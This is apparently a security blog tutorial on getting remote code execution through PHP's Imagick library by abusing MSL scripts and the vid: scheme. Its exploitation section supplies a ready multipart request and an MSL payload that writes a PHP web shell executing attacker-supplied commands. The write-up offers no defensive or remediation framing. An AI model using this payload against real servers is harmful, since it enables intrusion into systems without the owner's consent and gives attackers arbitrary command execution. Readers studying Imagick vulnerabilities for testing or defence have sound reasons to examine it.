---
title: "Surprising Imagick with RCE"
description: "Exploiting PHP's Imagick library through MSL scripting to achieve Remote Code Execution (RCE) on a vulnerable server."
---

![runcloud-install-imagemagick-imagick-single-720x183](https://github.com/kris3c/kris3c.github.io/assets/128035061/9e7d1a0c-38da-461a-b0aa-dd523c149f7b)

`Date : 27 Dec 2023 Wednesday`

Hey Hackers, In this article we will understand how we can abuse the imagic fucntion of php to execute our php code and gain RCE on the server.

### Table of Content


1. [Understanding Imagick](#understanding-imagick)
2. [Testing the vulnerability](#testing-the-vulnerability)
3. [Exploitation](#exploitation)

### Understanding Imagick 

Imagick is a library in PHP that allows us to manipulate any image file. It supports different formats png, jpg, txt etc but the most interesting supported format is MSL.

MSL stands for Magick Scripting Language and it is based on XML. It facilitate reading of images , manipulating them and storing them back in the filesystem.

Example :

```
touch /tmp/test/test.msl
```

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://IP/image.png" />
<write filename="/tmp/test/image-exported.png" />
</image>
```

This script will read the file image.png from the provided location and write the file in the /tmp/test directory.

To use the script in PHP we need to use the msl: scheme with in the Imagick function as :

```
php -r '$img = new Imagick("msl:/temp/test.msl");'
```

### Testing the vulnerability 

To test the vulnerability we can simply add "\[10x10]"  at the end of the filename 

```
{php
	path:"var/www/html/image.png[10x10]"
	...
}
```

Now check whether the content length is changed or not. If the content length is changed it indicates that we have access to the imagick library.  

### Exploitation 

```
Required Header :

Content-Type: multipart/form-data; boundary=ABC

Arguments for the required parameters :

vid:msl:/tmp/php*

Example : path paramter is required in the request that takes path of the image.

?path=/var/www/image.png
?path=vid:msl:/tmp/php*
```

**vid: scheme** - This scheme allows us to include tmp file with MSL content without actually knowing the name of the file. Here we are using wildcard with php to manipulate a php file.


```xml
--ABC
Content-Disposition: form-data; name="payload"; filename="payload.msl"
Content-Type: text/plain
 
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
 <write filename="info:</path/to/writeable/directory>/payload.php" />
</image>
--ABC--
```

Steps followed by the application are :

1. Calling the MSL script :  To call out the MSL script we need to know the absolute path of the script but we don't know that so we have used the vid: scheme to include a temp MSL script.
2. Executing the script : First server will read the content (our payload) as caption for the file then it will write the caption as information to the payload.php file.
